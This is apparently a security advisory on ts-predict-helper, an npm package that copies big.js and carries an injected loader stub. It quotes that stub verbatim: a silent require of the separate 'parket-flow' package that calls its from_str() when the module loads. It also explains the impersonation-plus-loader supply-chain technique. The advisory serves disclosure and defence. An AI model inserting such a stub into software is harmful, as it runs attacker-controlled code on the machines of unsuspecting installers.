summary: ts-predict-helper impersonates big.js and loads hidden `parket-flow` dependency at require time
details: The package is published as `ts-predict-helper` but its README, LICENCE, package.json metadata (description, keywords, repository pointing at MikeMcl/big.js), and source code are a verbatim copy of big.js v7.0.1. Inside the otherwise-pristine big.js source, a stub has been injected at big.js:605-608 (and identically at big.mjs:605-608): `try { const doc = require("parket-flow"); doc.from_str().then(e => { }).catch(e => { }) } catch (error) { }`. Any consumer that `require`s or `import`s this package immediately loads the `parket-flow` dependency (declared as `^3.0.2`) and invokes its `from_str()` function on the installer's machine, with all errors silently swallowed. The actual payload is staged in the separately-controlled `parket-flow` package, with this package serving as the namespace-impersonation lure for big.js. Combined behavior — identity deception + silent loader of an external dependency at module-load time — is the canonical loader-stub supply-chain attack.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
